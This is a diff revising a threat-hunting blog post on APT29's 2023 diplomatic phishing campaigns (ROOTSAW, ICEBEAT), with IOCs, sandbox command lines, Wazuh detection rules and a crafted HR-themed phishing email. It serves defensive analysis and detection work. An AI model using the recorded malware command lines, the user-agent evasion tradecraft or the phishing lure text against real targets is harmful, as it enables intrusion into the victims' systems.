-Last Update on "2024-12-31 10:00 AM"
-
-This URL will convert user to download file below:
-
-File Name: Note.pdf
-
-File Hash:
-46c8289301129c0833529495f4f3748b5adff78e18f1427654cb3b59735
-2873e (Highly Reported)
-
-Magic: PDF document, version 1.5, 1 pages
-
-Magika: PDF
-
-File Size: 59.70 KB (61135 bytes)
-
-![](/assets/img/posts/apt29-hunting/img-032.png)
-
-This is Edited Version of ROOTSAW that sends the victim’s user-agent to the compromised server using an HTTP GET request “https://parquesanrafael[.]cl/note.php?ua=”
-
-The server then performs filtering based on an actor-defined deny-list, finally returning a decryption key for the payload if the tests are successfully passed
-
-If these tests fail, ROOTSAW drops a corrupt file, rather than exposing the embedded decoy file like in previous versions
-
-Second Wave: its the same with simple addition a new variant of ROOTSAW containing both user-agent and IP filtering, but ultimately leading to the same MUSKYBEAT downloader
-
-File Name: note.html
-
-File Name:
-92a5be2893743435b79e94aa64a74233a2240fd790ca948e1cb046da5b407
-2f1_JC.html
-
-File Hash:
-92a5be2893743435b79e94aa64a74233a2240fd790ca948e1cb046da5b407
-2f1 ( Reported )
-
-Magic: HTML document, ASCII text, with very long lines (64557u)
-
-Magika: HTML
-
-File Size: 3.42 MB (3587003 bytes)
-
-### File Execution Details
-
-Score on tria.ge
-
-![](/assets/img/posts/apt29-hunting/img-033.png)
-
-### CommandLines
-
-C:\Program Files\Internet Explorer\iexplore.exe "C:\Program Files\Internet Explorer\iexplore.exe" C:\Users\Admin\AppData\Local\Temp\92a5be2893743435b79e94 aa64a74233a2240fd790ca948e1cb046da5b4072f1_JC.html
-
-C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE
-
+**Command lines:**
+```text
+"C:\Program Files\Internet Explorer\iexplore.exe"
+   C:\Users\Admin\AppData\Local\Temp\92a5be...4072f1_JC.html
 "C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE" SCODEF:2288 CREDAT:275457 /prefetch:2
-
-![](/assets/img/posts/apt29-hunting/img-034.png)
-
-![](/assets/img/posts/apt29-hunting/img-035.png)
-
-![](/assets/img/posts/apt29-hunting/img-036.png)
-
-![](/assets/img/posts/apt29-hunting/img-037.png)
-
-![](/assets/img/posts/apt29-hunting/img-038.png)
-
-![](/assets/img/posts/apt29-hunting/img-039.png)
-
-![](/assets/img/posts/apt29-hunting/img-040.png)
-
-## April 2023: Old Wine in a New Bottle
-
-This was the open gate for new technique for malware delivery
-
-They re-used one its frequent diplomatic event-themed lure documents spoofing the Czechia Embassy Known in Czech
-
-The invitation targets to a wine tasting event on April 13, 2023
-
-![](/assets/img/posts/apt29-hunting/img-041.png)
-
-the drafted document contained a link to the phishing website " https[:]//sylvio[.]com[.]br/form.php "
-
-delivered either an ISO or a ZIP archive to the victim
-
-Technique here focuses on sending the malware directly from malicious web server also they removed any HTML smuggling to reduce the number of forensic artifacts left on the host that are prone to detection or later analysis by any detection teams
-
-![](/assets/img/posts/apt29-hunting/img-042.png)
-
-![](/assets/img/posts/apt29-hunting/img-043.png)
-
-File Name: Wine event.pdf
-
-File Hash:
-62ce8e1489a8b87539792c07179faf1db1b46caa39b55902a4d82dcec44d72
-ae ( Highly Reported )
-
-Magic: PDF document, version 1.5, 1 pages
-
-Magika: PD
-
-File size: 61.53 KB (63011 bytes)
-
-First Seen In The Wild: 2023-04-06 16:43:48 UTC
-
-![](/assets/img/posts/apt29-hunting/img-044.png)
-
-![](/assets/img/posts/apt29-hunting/img-045.png)
-
-![](/assets/img/posts/apt29-hunting/img-046.png)
-
-![](/assets/img/posts/apt29-hunting/img-047.png)
-
-tria.ge score
-
-![](/assets/img/posts/apt29-hunting/img-048.png)
-
-### Commands
-
 ```
-C:\Program Files (x86)\Adobe\Reader 9.0\Reader\AcroRd32.exe
+
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-034.png" width="360" alt="exec"/></td><td><img src="/assets/img/posts/apt29-hunting/img-035.png" width="360" alt="exec"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-036.png" width="360" alt="exec"/></td><td><img src="/assets/img/posts/apt29-hunting/img-037.png" width="360" alt="exec"/></td></tr>
+</table>
+
+#### 🗓️ April 2023 — "Old Wine in a New Bottle"
+
+This campaign opened a **new malware-delivery technique**. APT29 re-used a frequent diplomatic-event lure spoofing the **Czechia Embassy** — an invitation to a **wine-tasting event on April 13, 2023**.
+
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-038.png" width="350" alt="wine lure"/></td><td><img src="/assets/img/posts/apt29-hunting/img-039.png" width="350" alt="wine lure"/></td><td><img src="/assets/img/posts/apt29-hunting/img-040.png" width="350" alt="wine lure"/></td></tr>
+</table>
+
+The document linked to the phishing site `https://sylvio[.]com[.]br/form.php`, which delivered **either an ISO or a ZIP** archive. Notably, the actors **removed HTML smuggling** to reduce forensic artifacts left on the host.
+
+<img src="/assets/img/posts/apt29-hunting/img-041.png" width="420" alt="wine event delivery"/>
+
+| Field | Value |
+|-------|-------|
+| **File name** | `Wine event.pdf` |
+| **File hash (SHA-256)** | `62ce8e1489a8b87539792c07179faf1db1b46caa39b55902a4d82dcec44d72ae` *(highly reported)* |
+| **Magic** | PDF document, version 1.5, 1 page |
+| **File size** | 61.53 KB (63,011 bytes) |
+| **First seen (VT)** | 2023-04-06 16:43:48 UTC |
+
+**Commands** — opening the PDF spawns Adobe Reader 9.0 / Acrobat Reader DC CEF processes:
+
+```text
 "C:\Program Files (x86)\Adobe\Reader 9.0\Reader\AcroRd32.exe"
-"C:\Users\Admin\AppData\Local\Temp\62ce8e1489a8b87539792c0717
-9faf1db1b46caa39b55902a4d82dcec44d72ae.pdf"
+   "C:\Users\Admin\AppData\Local\Temp\62ce8e...d72ae.pdf"
+"...\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" --backgroundcolor=16514043
+"...\AcroCEF\RdrCEF.exe" --type=gpu-process ...
 ```
 
-C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe"C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" -- backgroundcolor=16514043
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-042.png" width="380" alt="commands"/></td><td><img src="/assets/img/posts/apt29-hunting/img-043.png" width="380" alt="commands"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-044.png" width="380" alt="commands"/></td><td><img src="/assets/img/posts/apt29-hunting/img-045.png" width="380" alt="commands"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-046.png" width="380" alt="commands"/></td><td><img src="/assets/img/posts/apt29-hunting/img-047.png" width="380" alt="commands"/></td></tr>
+</table>
 
-C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe
+#### 🗓️ May 2023 — Ukraine Foreign-Embassy Campaigns (Kyiv)
 
-"C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\RdrCEF.exe" --type=gpu-process --disable- pack-loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroCEF\debug.log" -- log-severity=disable --product- version="ReaderServices/19.10.20064 Chrome/64.0.3282.119" -- gpu-preferences=GAAAAAAAAAAAB4AAAQAAAAAAAAAAAGAA --use-gl=swiftshader-webgl --gpu-vendor-id=0x1234 --gpu-device- id=0x1111 --gpu-driver-vendor="Google Inc." --gpu-driver- version=3.3.0.2 --gpu-driver-date=2017/04/07 --disable-pack- loading --lang=en-US --log-file="C:\Program Files (x86)\Adobe\Acrobat Reader DC
+In the lead-up to Ukraine's counteroffensive, APT29 ran **two phishing waves** against diplomatic representations in **Kyiv**, including those of Moscow's partners.
 
-## May 2023: Ukraine Foreign Embassy-Focused Campaigns
+**First wave — the BMW lure.** A Polish diplomat had sent a legitimate email advertising a **used BMW for sale in Kyiv**. APT29 intercepted that flyer and repurposed it to deliver `bmw.iso`.
 
-in the lead up to Ukraine’s counteroffensive, APT29 conducted two distinct phishing waves targeting a wide range of diplomatic representations in Kyiv, including those of Moscow’s partners. Each campaign adopted separate intrusion chains similar to those seen in March and April 2023 first wave in early may, An repurposed advertisement for a BMW for sale in Kyiv a Polish diplomat sent a legitimate email to various embassies advertising a used BMW for sale in Kyiv, APT29 intercepted this flyer and repurposed it for a phishing attack as way to download "bmw.iso"
+The ROOTSAW variant shared similarities with the March 2023 Türkiye variant; both used **User-Agent filtering** to decide what to serve:
 
-The version of the ROOTSAW malware used in the May 2023 BMW-themed phishing campaign in Kyiv shared similarities with variants deployed in March 2023 against Türkiye. Both campaigns, attributed to the Russian- backed group APT29, utilized a dropper malware named ROOTSAW and incorporated user-agent filtering to evade detection and analysis
+| Campaign | User-Agent check | If criteria not met |
+|----------|------------------|---------------------|
+| **Türkiye (Mar 2023)** | Windows OS, `Windows NT` present, **no** `.NET` | Serves a **decoy PDF** |
+| **Kyiv BMW (May 2023)** | Similar UA filtering | Serves weaponized `bmw.iso` **or** a harmless decoy BMW image |
 
-A key feature of these campaigns was the use of user-agent filtering to determine what content would be delivered to the target. The malware would check the user-agent string of the device making the request to identify its operating system and other characteristics
+| Field | Value |
+|-------|-------|
+| **File name** | `bmw.iso` |
+| **File hash (MD5)** | `e306333093eaf198f4d416d25a40784a` *(highly reported)* |
+| **Magic** | ISO 9660 CD-ROM filesystem data 'CDROM' |
+| **File size** | 7.59 MB (7,960,576 bytes) |
 
-In the Türkiye Campaign (March 2023): The ROOTSAW variant checked for Windows operating systems that did not contain ".NET" and included the value "Windows NT" in the user-agent string. If the target's system did not meet these criteria, such as a non-Windows OS or a request made through.NET, the server would deliver a decoy PDF file instead of the malicious payload. This tactic helped the attackers avoid automated analysis tools and non-compatible devices
+**Targets inside the ISO:** `AppvIsvSubsystems64.dll`, `MSVCP140.dll`, `Mso20Win32Client.DLL`, `windoc.exe`, `bmw1.png.lnk`
 
-In the Kyiv BMW Campaign (May 2023): A similar user-agent filtering mechanism was employed. Depending on the user-agent of the potential victim, the server would either deliver the weaponized ISO file ( bmw.iso ) or a harmless decoy image of the BMW being advertised
-
-File Name: bmw.iso
-
-File Hash: e306333093eaf198f4d416d25a40784a (Highly Reported)
-
-Magic: ISO 9660 CD-ROM filesystem data 'CDROM'
-
-Magika: ISO
-
-File size: 7.59 MB (7960576 bytes)
-
-tria.ge score:
-
-![](/assets/img/posts/apt29-hunting/img-049.png)
-
-### Targets
-
-AppvIsvSubsystems64.dll
-
-MSVCP140.dll
-
-Mso20Win32Client.DLL windoc.exe bmw1.png.lnk
-
-### CommandLines
-
+**Command lines:**
+```text
 cmd /c C:\Users\Admin\AppData\Local\Temp\bmw1.png.lnk
-
-"C:\Windows\System32\conhost.exe" cmd /c start.$Recycle.Bin\windoc.exe && ".$Recycle.Bin\bmw1.png"
-
-cmd /c start.$Recycle.Bin\windoc.exe &&.$Recycle.Bin\bmw1.png
-
+"C:\Windows\System32\conhost.exe" cmd /c start .$Recycle.Bin\windoc.exe && ".$Recycle.Bin\bmw1.png"
+cmd /c start .$Recycle.Bin\windoc.exe && .$Recycle.Bin\bmw1.png
 .$Recycle.Bin\windoc.exe
+```
+**Process tree:** `bmw1.png.lnk ─► cmd.exe ─► conhost.exe ─► windoc.exe`
 
-Process Tree: bmw1.png.lnk > cmd.exe > conhost.exe > windoc.exe
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-044.png" width="380" alt="bmw analysis"/></td><td><img src="/assets/img/posts/apt29-hunting/img-050.png" width="380" alt="bmw process tree"/></td></tr>
+</table>
 
-![](/assets/img/posts/apt29-hunting/img-050.png)
+**Second wave — charity-concert lure.** In mid-May 2023, APT29 used an **invitation to a charity concert** as a lure, sending a misspelled attachment **`Invintation.zip`**. The payloads were hosted on actor-controlled infrastructure with **User-Agent filtering**, serving either a decoy-PDF ZIP or a second-stage-malware ZIP.
 
-### Second Wave
+<img src="/assets/img/posts/apt29-hunting/img-051.png" width="420" alt="charity concert lure"/>
 
-In mid-May 2023, the Russian-backed threat group APT29 launched a second wave of phishing attacks targeting diplomatic entities in Kyiv. This campaign followed an earlier attack that used a repurposed advertisement for a BMW. The second wave used an invitation to a charity concert as a lure and, like the previous campaign, likely involved the use of a copy of a legitimate document
+| Field | Value |
+|-------|-------|
+| **File name** | `Invintation.zip` |
+| **File hash (MD5)** | `38719acc6254b7ff70dc8a7723bd8e92` |
+| **Payload hash (MD5)** | `1aee5bf23edb7732fd0e6b2c61a959ce` |
+| **Downloaded from** | `https://gavice[.]ng/event_program.php` |
 
-The attackers sent emails containing a file with the misspelled name " Invintation.zip "
-
-The payloads for this attack were hosted on actor controlled infrastructure setup used user-agent filtering to selectively deliver either a ZIP file containing decoy PDF documents or a different ZIP file with second-stage malware payloads
-
-These operations were part of a broader effort by the group to target diplomatic missions in Ukraine in the period leading up to the country's counteroffensive
-
-![](/assets/img/posts/apt29-hunting/img-051.png)
-
-File Name: Invintation.zip
-
-File Hash: 38719acc6254b7ff70dc8a7723bd8e92
-
-That's All what i could find about this file, will update if i found something
-
-Payload Name:
-
-Payload Hash: 1aee5bf23edb7732fd0e6b2c61a959ce
-
-Downloaded From: https//gavice.ng/event_program.php
-
-![](/assets/img/posts/apt29-hunting/img-052.png)
-
-![](/assets/img/posts/apt29-hunting/img-053.png)
-
-### All Dropped Files
-
+**Dropped files:**
+```text
 2d794d1544f933aacbd8da2dad78b381
-
-5569fb4e9140974a80b4b7587b026913 (BURNTBATTER)
-
+5569fb4e9140974a80b4b7587b026913   (BURNTBATTER)
 1c0059d976795ceded7c1dd706e74bd1
-
-595d8ea258ef8d8ec70b0e8a740e903c (DONUT)
-
-invitation_letter_and_programme_17.05.2023_en.pdf.exe invitation_letter_and_programme_17.05.2023_ua.pdf.exe
-
-## June 2023: Split ROOTSAW Campaign
-
-In late June 2023 APT29 conducted a phishing campaign against a European government using a new variant of the ROOTSAW malware. The operation, dubbed the "Split ROOTSAW Campaign," employed novel delivery methods and evasion techniques
-
-Phishing emails were sent from a compromised North American government email address. The emails were disguised as an invitation to a public holiday celebration from Norwegian embassy staff to target a European government
-
-APT29 hosted the ROOTSAW payload on a compromised WordPress server
-
-To evade detection, the server was configured to return a generic HTTP 404 error to non-valid targets, rather than the standard WordPress 404 error. Madinat noted that this tactic would likely hide the activity from WordPress level logs, though evidence might still exist in the underlying web server logs version of ROOTSAW delivered via the SVG file was a primitive variant, similar to those first seen in 2021. It lacked the anti-analysis features and hardening seen in more recent versions. This reversion to a simpler payload is consistent with APT29's pattern of using less sophisticated malware when experimenting with new delivery techniques
-
-### PDF Mechanism
-
-File Name: reception.pdf
-
-File Hash:
-a8b56b51e085955b5641a9cb74c3b66ee5c37d62703f28b01cfbf7122a
-7edbfa
-
-Magic: PDF document, version 1.5, 1 pages
-
-File Size: 25.23 KB (25839 bytes)
-
-First Seen In The Wild: 2023-06-23 10:40:26 UTC
-
-Emails with an attached Scalable Vector Graphic (SVG) file:
-
-File Name: __substg1.0_37010102
-
-File Hash:
-4875a9c4af3044db281c5dc02e5386c77f331e3b92e5ae79ff9961d8cd1f
-7c4f
-
-Magic: SVG Scalable Vector Graphics image
-
-Magika: SVG
-
-File Size: 61 MB (2737155 bytes)
-
-invitation.svg
-
-![](/assets/img/posts/apt29-hunting/img-054.png)
-
-![](/assets/img/posts/apt29-hunting/img-055.png)
-
-![](/assets/img/posts/apt29-hunting/img-056.png)
-
-![](/assets/img/posts/apt29-hunting/img-057.png)
-
-![](/assets/img/posts/apt29-hunting/img-058.png)
-
-## July 2023: ICEBEAT Campaign
-
-In July 2023, APT29 continued to evolve its tactics by deploying a new downloader called ICEBEAT and using a PDF document to deliver its ROOTSAW malware for the first time
-
-This campaign targeted European diplomatic entities with a phishing lure disguised as an invitation to a German embassy event
-
-Emails purported to be an invitation from a German embassy for an Ambassador’s farewell reception
-
-This was the first observed instance of APT29 embedding its ROOTSAW malware loader within a PDF document. When opened, the PDF would write an HTML file to the disk. Launching this HTML file then created a ZIP file and initiated a connection to an attacker-controlled domain ( https://sgrfh[.]org.pk/wp-content/idx.php?n=ks&q= ) to profile the victim's system
-
-ICEBEAT downloader used the open-source Zulip messaging platform for its command and control communications. This tactic is consistent with APT29's established pattern of abusing legitimate services for C2, which has previously included Dropbox, Firebase, OneDrive, and Trello. ICEBEAT was responsible for downloading subsequent payloads from the Zulip service
-
-![](/assets/img/posts/apt29-hunting/img-059.png)
-
-### File Details
-
-File Name: reception.pdf
-
-File Hash:
-a8b56b51e085955b5641a9cb74c3b66ee5c37d62703f28b01cfbf7122a
-7edbfa
-
-Magic: PDF document, version 1.5, 1 pages
-
-File Size: 25.23 KB (25839 bytes)
-
-First Seen In The Wild: 2023-06-23 10:40:26 UTC
--
-
-![](/assets/img/posts/apt29-hunting/img-060.png)
-
-![](/assets/img/posts/apt29-hunting/img-061.png)
-
-### Detection Steps
-
-First lets create rules to detect macro came from any.office file
-
-Install Sysmon in ur agent
-
-Check this ref to create rules by XML: https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml- syntax/rules.html
-
+595d8ea258ef8d8ec70b0e8a740e903c   (DONUT)
+invitation_letter_and_programme_17.05.2023_en.pdf.exe
+invitation_letter_and_programme_17.05.2023_ua.pdf.exe
 ```
+
+<img src="/assets/img/posts/apt29-hunting/img-052.png" width="380" alt="dropped files"/> <img src="/assets/img/posts/apt29-hunting/img-053.png" width="380" alt="dropped files"/>
+
+#### 🗓️ June 2023 — "Split ROOTSAW" Campaign
+
+In late June 2023, APT29 targeted a **European government** with a new ROOTSAW variant. Phishing emails were sent from a **compromised North American government email address**, disguised as an invitation to a public-holiday celebration from **Norwegian embassy staff**.
+
+Key tradecraft:
+
+- ROOTSAW payload hosted on a **compromised WordPress server**.
+- The server returned a **generic HTTP 404** to non-valid targets (instead of the standard WordPress 404), hiding activity from WordPress-level logs while leaving traces in the underlying web-server logs.
+- The ROOTSAW delivered via **SVG** was a **primitive variant** (similar to 2021), lacking modern anti-analysis hardening — consistent with APT29 using simpler malware when trialing new delivery methods.
+
+**PDF mechanism:**
+
+| Field | Value |
+|-------|-------|
+| **File name** | `reception.pdf` |
+| **File hash (SHA-256)** | `a8b56b51e085955b5641a9cb74c3b66ee5c37d62703f28b01cfbf7122a7edbfa` |
+| **Magic** | PDF document, version 1.5, 1 page |
+| **File size** | 25.23 KB (25,839 bytes) |
+| **First seen (VT)** | 2023-06-23 10:40:26 UTC |
+
+**SVG attachment:**
+
+| Field | Value |
+|-------|-------|
+| **File name** | `__substg1.0_37010102` / `invitation.svg` |
+| **File hash (SHA-256)** | `4875a9c4af3044db281c5dc02e5386c77f331e3b92e5ae79ff9961d8cd1f7c4f` |
+| **Magic** | SVG Scalable Vector Graphics image |
+| **File size** | 2.74 MB (2,737,155 bytes) |
+
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-055.png" width="380" alt="split rootsaw"/></td><td><img src="/assets/img/posts/apt29-hunting/img-056.png" width="380" alt="split rootsaw"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-057.png" width="380" alt="split rootsaw"/></td><td><img src="/assets/img/posts/apt29-hunting/img-058.png" width="380" alt="split rootsaw"/></td></tr>
+</table>
+
+**Attack chain (SVG → ISO → loaders → C2):**
+
+<div align="center"><img src="/assets/img/posts/apt29-hunting/img-054.png" width="320" alt="Split ROOTSAW attack chain diagram"/></div>
+
+#### 🗓️ July 2023 — "ICEBEAT" Campaign
+
+In July 2023, APT29 deployed a new downloader called **ICEBEAT** and, for the **first time**, used a **PDF to deliver ROOTSAW**. The lure impersonated a **German embassy** invitation to an Ambassador's farewell reception.
+
+Execution flow:
+
+1. Opening the PDF writes an **HTML** file to disk.
+2. Launching the HTML creates a **ZIP** file and connects to `https://sgrfh[.]org.pk/wp-content/idx.php?n=ks&q=` to profile the victim.
+3. **ICEBEAT** uses the open-source **Zulip** messaging platform for C2 — consistent with APT29's pattern of abusing legitimate services (Dropbox, Firebase, OneDrive, Trello). ICEBEAT downloads subsequent payloads from Zulip.
+
+| Field | Value |
+|-------|-------|
+| **File name** | `reception.pdf` |
+| **File hash (SHA-256)** | `a8b56b51e085955b5641a9cb74c3b66ee5c37d62703f28b01cfbf7122a7edbfa` |
+| **Magic** | PDF document, version 1.5, 1 page |
+| **File size** | 25.23 KB (25,839 bytes) |
+| **First seen (VT)** | 2023-06-23 10:40:26 UTC |
+
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-059.png" width="380" alt="ICEBEAT"/></td><td><img src="/assets/img/posts/apt29-hunting/img-060.png" width="380" alt="ICEBEAT"/></td></tr>
+</table>
+
+### 2.3 How the ROOTSAW Dropper Works
+
+APT29 incorporated a new version of its **ROOTSAW** dropper with enhanced anti-analysis and evasion. Key features:
+
+| Feature | Description |
+|---------|-------------|
+| **User-Agent filtering** | Checks the connecting device's UA for `Windows NT` while ensuring it does **not** contain `.NET`. |
+| **Decoy file delivery** | Non-Windows / `.NET` requests receive a **benign decoy PDF** instead of the payload — defeating sandboxes. |
+| **Consistent decoys** | In one wave, the decoy PDF served to filtered-out targets was **identical** to the one inside the malicious ZIP — reducing suspicion. |
+| **Payload obfuscation** | Each payload is obfuscated with a **unique key**, while the deobfuscation routine stays the same — frustrating reverse engineering. |
+
+### 2.4 Detection Engineering (Wazuh + Sysmon)
+
+**Goal:** detect macros originating from any Office file. Install **Sysmon** on the agent, then build XML rules in Wazuh.
+
+> 📎 Rule syntax reference: <https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml-syntax/rules.html>
+
+```xml
 <group name="local-phishing-attachment">
-<!-- 1. ProcessCreate: Office app spawns a scripting/powershell
-process -->
-<rule id="200001" level="12">
-<if_group>sysmon,</if_group>
-<match>ParentImage: .*\\(winword|excel|powerpnt|outlook)\.exe</match>
-<match>Image: .*\\
-(powershell|pwsh|wscript|cscript|cmd|rundll32)\.exe</match>
-<description>Possible macro / attachment execution: Office spawned
-scripting / powershell</description>
-</rule>
-```
 
-```
-<!-- 2. CommandLine contains encoded/obfuscated powershell or
-suspicious flags -->
-<rule id="200002" level="12">
-<if_group>sysmon,</if_group>
-<match>CommandLine: .*(-EncodedCommand|-enc|iex|IEX )</match>
-<description>Potential encoded/obfuscated PowerShell seen (often used
-by malicious macros)</description>
-</rule>
-```
+  <!-- 1. ProcessCreate: Office app spawns a scripting/powershell process -->
+  <rule id="200001" level="12">
+    <if_group>sysmon,</if_group>
+    <match>ParentImage: .*\\(winword|excel|powerpnt|outlook)\.exe</match>
+    <match>Image: .*\\(powershell|pwsh|wscript|cscript|cmd|rundll32)\.exe</match>
+    <description>Possible macro / attachment execution: Office spawned scripting/PowerShell</description>
+  </rule>
 
-```
-<!-- 3. FIM: new suspicious attachment file added (docm, xlsm, vbs,
-js) -->
-<rule id="200003" level="10">
-<if_group>syscheck,</if_group>
-<match>added</match>
-<match>\.(docm|xlsm|pptm|vbs|js|hta)$</match>
-<description>Suspicious attachment file added to monitored
-folder</description>
-```
+  <!-- 2. CommandLine contains encoded/obfuscated PowerShell or suspicious flags -->
+  <rule id="200002" level="12">
+    <if_group>sysmon,</if_group>
+    <match>CommandLine: .*(-EncodedCommand|-enc|iex|IEX )</match>
+    <description>Potential encoded/obfuscated PowerShell (often used by malicious macros)</description>
+  </rule>
 
-```
-</rule>
+  <!-- 3. FIM: new suspicious attachment file added (docm, xlsm, vbs, js) -->
+  <rule id="200003" level="10">
+    <if_group>syscheck,</if_group>
+    <match>added</match>
+    <match>\.(docm|xlsm|pptm|vbs|js|hta)$</match>
+    <description>Suspicious attachment file added to monitored folder</description>
+  </rule>
+
 </group>
 ```
 
-### Goal
+**Relevant telemetry events:**
 
-Simulate a Sysmon / Windows Event that matches the behavior of opening a malicious attachment ( winword.exe or excel.exe spawning powershell / wscript ) and feed that event into Wazuh using wazuh-logtest.
+| Event | Description |
+|-------|-------------|
+| **WinEvent 4688** | Process Creation (`winword.exe → powershell.exe`) |
+| **WinEvent 4104** | PowerShell Script Block Logging |
+| **Sysmon 1** | Process creation |
+| **Sysmon 3** | Network connection (PowerShell → attacker) |
+| **Sysmon 7** | ImageLoaded (VBA loads an unusual DLL) |
+| **Sysmon 11** | File Create (macro dropped `.exe`) |
+| **Sysmon 6** | Driver loaded (rare) |
 
-Or perform a safe FIM test by creating a suspicious-named file (e.g., invoice_malicious.docm ) in a monitored folder and verify Wazuh generates an added alert. Both methods are safe (no real macro execution).
+**Simulation goal:** reproduce a Sysmon/Windows event matching a malicious-attachment open (`winword.exe`/`excel.exe` spawning `powershell`/`wscript`) and feed it into Wazuh with `wazuh-logtest`. Alternatively, perform a safe **FIM** test by creating a suspicious file (e.g. `invoice_malicious.docm`) in a monitored folder and confirm an `added` alert. Both methods are safe (no real macro execution).
 
-### What we will detect
+**What we detect:** Office spawning a script/PowerShell child · suspicious PS flags (`-EncodedCommand`, `-enc`, `iex`) · new files with macro/script extensions.
 
-Office process spawning scripting/Powershell (child process) indicates a macro or attachment executing code.
+**Observable indicators (deep investigation):**
 
-Suspicious PowerShell flags (e.g., -EncodedCommand, -enc, iex ) in CommandLine.
+```text
+WINWORD.EXE  => powershell.exe
+WINWORD.EXE  => mshta.exe
+WINWORD.EXE  => regsvr32.exe
+Outlook.exe  => Winword.exe
 
-FIM: new files with macro/script extensions (.docm,.xlsm,.pptm,.vbs,.js, .hta ).
-
-### Events
-
-Event Description
-
-WinEvent 4688 Process Creation (word.exe → powershell.exe)
-
-WinEvent 4104 PowerShell Script Block Logging
-
-WinEvent 7 (Sysmon) ImageLoaded (VBA loads weird DLL)
-
-Sysmon 1 Process creation
-
-Sysmon 11 File Create (macro dropped.exe)
-
-Sysmon 3 Network connection (powershell to attacker)
-
-Sysmon 6 Driver loaded (rare cases)
-
-### Deep Investigation
-
-### Observable Indicators
-
-WINWORD.EXE => powershell.exe
-
-WINWORD.EXE => mshta.exe
-
-WINWORD.EXE => regsvr32.exe
-
-Outlook.exe => Winword.exe
-
-Macro writes to:
-
-%APPDATA%\Microsoft\
-
-%LOCALAPPDATA%\Temp\
-
-%ProgramData%\ (rare)
-
-Macro drops file:.exe |.js |.vbs |.dll
-
-PowerShell hidden/noninteractive:
-
-powershell.exe -nop -w hidden
-
-### Sample
-
-i will use crafted sample of phishing mail came from this APT Group:
-
-![](/assets/img/posts/apt29-hunting/img-062.png)
-
-![](/assets/img/posts/apt29-hunting/img-063.png)
-
-### Body is
-
-Hello, Please review the attached Salary Adjustment Form for 2025. Your digital signature is required before 12 Feb 2025.
-
-To ensure document security, the file is delivered in a protected format. If prompted, click Enable Content to view the document.
-
-Let me know if you have any questions.
-
-Regards,
-
+Macro writes to:  %APPDATA%\Microsoft\  ·  %LOCALAPPDATA%\Temp\  ·  %ProgramData%\ (rare)
+Macro drops:      .exe | .js | .vbs | .dll
+PowerShell:       powershell.exe -nop -w hidden   (hidden / non-interactive)
 ```
-Mail Header:
+
+<img src="/assets/img/posts/apt29-hunting/img-061.png" width="360" alt="detection rule test"/>
+
+### 2.5 Crafted Phishing Sample & Malware Analysis
+
+A crafted phishing email modeled on this group's tradecraft:
+
+> **Body**
+> Hello,
+> Please review the attached **Salary Adjustment Form for 2025**. Your digital signature is required before **12 Feb 2025**.
+> To ensure document security, the file is delivered in a protected format. If prompted, click **Enable Content** to view the document.
+> Regards, HR Compensation Team
+
+**Mail header (abridged):**
+```text
 Return-Path: hr.department@secure-docs-support.com
-Received: from mail.secure-docs-support.com (mail.secure-docs-support.com
-[185.83.121.44])
-by mail.victim.local with ESMTPS id 123456789
-for user@victim.local;
-Tue, 11 Feb 2025 10:22:33 +0200
+Received: from mail.secure-docs-support.com ([185.83.121.44])
+   by mail.victim.local with ESMTPS id 123456789
+   for user@victim.local; Tue, 11 Feb 2025 10:22:33 +0200
 Subject: Updated Salary Adjustment Form - Action Required
-From: HR Department hr.department@secure-docs-support.com
+From: HR Department <hr.department@secure-docs-support.com>
 To: user@victim.local
-Date: Tue, 11 Feb 2025 10:22:12 +0200
-MIME-Version: 1.0
-```
-
-```
 Message-ID: 20250211AHR-44321@mail.secure-docs-support.com
 Content-Type: multipart/mixed; boundary="----=_Part_8848_9912413.1707643333002"
-```
-
-```
-------=_Part_8848_9912413.1707643333002
-Content-Type: text/html; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
-```
-
-Hello, Please review the attached Salary Adjustment Form for 2025. Your digital signature is required before 12 Feb 2025.
-
-To ensure document security, the file is delivered in a protected format. If prompted, click Enable Content to view the document.
-
-Let me know if you have any questions.
-
-Regards, HR Compensation Team
-
-```
-------=_Part_8848_9912413.1707643333002
+...
 Content-Type: application/octet-stream; name="Salary_Adjustment.iso"
 Content-Transfer-Encoding: base64
-```
-
 Content-Disposition: attachment; filename="Salary_Adjustment.iso"
-
-```
-TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAA4fug4P////8BAAEAAA
-AAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
-[Truncated malicious ISO base64 for safety]
+TVqQAAMAAAAEAAAA//8AALgAAAAA...   [Truncated malicious ISO base64 for safety]
 ```
 
-------=_Part_8848_9912413.1707643333002--
+**Analyst quick-checks:**
 
-### Quick Checks
+- [ ] Inspect the `Received:` chain
+- [ ] Identify spoofing → validate domain, DKIM/SPF failures
+- [ ] Extract the ISO base64 and decode manually
+- [ ] Mount the ISO in an isolated VM
+- [ ] Analyze the `.lnk` metadata
 
-Check Received: chain
